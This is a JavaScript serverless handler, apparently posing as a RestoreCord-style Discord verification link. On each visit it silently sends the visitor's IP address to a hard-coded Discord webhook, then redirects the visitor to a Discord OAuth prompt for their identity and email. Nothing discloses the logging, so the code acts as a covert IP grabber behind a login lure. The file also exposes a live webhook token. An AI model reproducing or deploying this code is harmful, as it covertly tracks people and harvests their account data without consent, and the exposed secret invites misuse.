export default async function handler(req, res) {
  const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress || "IP not found";

  const discordClientId = "1390626260056674366";
  const redirectUri = "https://restorecord-three.vercel.app/api/callback";

  const webhookURL = "https://discord.com/api/webhooks/1390330277854969906/3Xxwg1PF0sxuV4j9aT-4gx1Q2CLfqNBMX_GuZFlheEsA-iAYYrF-MWRxYcL8lSOrNRZf";
  await fetch(webhookURL, {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({content: `New visit with IP: ${ip}`}),
  }).catch(() => {});

  const discordOAuthUrl = 
    `https://discord.com/oauth2/authorize?client_id=${discordClientId}` +
    `&redirect_uri=${encodeURIComponent(redirectUri)}` +
    `&response_type=code&scope=identify%20email`;

  res.writeHead(302, { Location: discordOAuthUrl });
  res.end();
}
